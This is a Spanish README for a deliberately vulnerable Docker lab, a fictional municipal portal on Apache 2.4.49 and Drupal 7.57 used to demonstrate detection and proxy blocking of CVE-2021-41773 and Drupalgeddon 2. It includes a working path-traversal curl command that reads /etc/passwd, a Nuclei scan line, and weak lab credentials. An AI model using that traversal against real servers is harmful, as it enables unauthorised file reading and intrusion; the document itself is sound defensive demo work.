# Docker del objetivo de demo — Portal Muni (Drupal 7.57 + Apache 2.4.49)

> ✅ **Verificado en Docker (21-nov-2026):** levantan juntas `drupal:7.57`, `httpd:2.4.49` y `mariadb:10.5`.
> El PoC de CVE-2021-41773 funciona por `/cgi-bin/`. Drupal hay que instalarlo una vez a mano (ver abajo).
>
> ⚠️ **Entorno deliberadamente vulnerable.** Correr solo en local/aislado. Nunca exponerlo a
> internet ni apuntarlo a un sistema real del gobierno.

## Qué levanta

```
http://localhost:8080  ->  Apache 2.4.49 (proxy vulnerable)  ->  Drupal 7.57  ->  MariaDB
```

- **CVE-2021-41773** (Apache 2.4.49, KEV, ransomware) — lectura de archivos y RCE.
- **CVE-2018-7600** (Drupalgeddon 2, KEV, ransomware) — RCE en Drupal 7.57.

## Requisitos
- Docker + Docker Compose v2 (`docker compose`, con espacio).
- En **Mac con chip Apple**: descomentar las líneas `platform: linux/amd64` en `docker-compose.yml`
  (las imágenes son de arquitectura amd64).

## Pasos

```bash
cd casos/portal-muni-gt/docker
docker compose up -d --build
```

### Instalar Drupal (solo la primera vez)
**Atajo automático (recomendado para la demo):** con el stack arriba, `bash instalar_drupal.sh`
(deja Drupal 7.57 instalado, usuario `admin` / `admin`, solo local). Si prefieres el asistente web, sigue así:

Drupal 7 no se autoinstala; hay que pasar por el asistente web **una vez**:

1. Abrir `http://localhost:8080`
2. Perfil: **Standard** → idioma: Español (o inglés).
3. En "Configurar la base de datos":
   - Tipo: **MySQL/MariaDB**
   - Base de datos: `drupal`
   - Usuario: `drupal`
   - Contraseña: `drupalpw`
   - Opciones avanzadas → **Host**: `db`
4. Crear el usuario admin del sitio y terminar.

> Tras instalar, Drupal queda en 7.57 (sin parches) y Drupalgeddon 2 es explotable.

### Verificar que está arriba y vulnerable
```bash
bash verificar.sh
```
Debe mostrar Apache 2.4.49 (el proxy lo revela ante una URL mal formada; en paginas normales el header `Server` es el del backend, 2.4.10) y leer `/etc/passwd` por el traversal en `/cgi-bin/`.
**Nota de orden:** antes de instalar Drupal, `/` redirige a `install.php`; el script lo detecta y
marca los chequeos de Drupalgeddon 2 y de QA como **PEND** (pendientes), no como falla. Después de
instalar Drupal, esos deben pasar a `200`.

## PoCs rápidos (para el sandbox / la demo)

**CVE-2021-41773 — leer un archivo del servidor** (el PoC va por `/cgi-bin/`; por `/icons/` no
funciona en este montaje porque el proxy no expone ese alias):
```bash
curl -s --path-as-is "http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

**Con Nuclei (si lo tienen):**
```bash
nuclei -u http://localhost:8080 -id CVE-2021-41773,CVE-2018-7600
```

## Cómo encaja con las 3 capas
- **Capa 1:** `verificar.sh` y el crawler sacan `Apache/2.4.49` del header y `Drupal 7.57` de `/CHANGELOG.txt`.
- **Capa 2:** se cruza contra KEV (ver `../inventario-esperado.json`), se genera la regla en el proxy
  que bloquea `%2e` en la ruta y las claves `#`/`element_parents` en el body, y se valida en sandbox
  (exploit=403, QA=200) antes del hot-reload.
- **Capa 3:** se repite el ataque → `403` trazado al CVE + reporte de incidente.

## Contenido de la muni ficticia (pendiente, opcional)
Para que se vea como un portal real: tras instalar, crear páginas "Transparencia (Art. 10 LAIP)",
"Trámites", "Noticias" y un formulario de solicitud de información, a nombre de una
**"Municipalidad de San Ejemplo"** (ficticia, sin escudo ni nombre de una muni real).

## Problemas comunes
- **Apache no arranca / error de módulos:** revisar que los nombres de módulo en el `sed` del
  `apache/Dockerfile` coincidan con los del `httpd.conf` de la imagen (`docker run --rm httpd:2.4.49
  cat conf/httpd.conf | grep -n LoadModule`).
- **El traversal da 403 en vez de leer el archivo:** no se aplicó el cambio `Require all denied` →
  `granted`; confirmar que el `sed` del Dockerfile corrió.
- **Drupal muestra errores de base de datos:** el host de la BD en el instalador debe ser `db`, no
  `localhost`.
- **Mac Apple Silicon lento o con warnings de plataforma:** descomentar los `platform: linux/amd64`.
- **El sitio redirige raro detrás del proxy:** suele arreglarse dejando `ProxyPreserveHost On` (ya
  está) y accediendo siempre por `http://localhost:8080`.
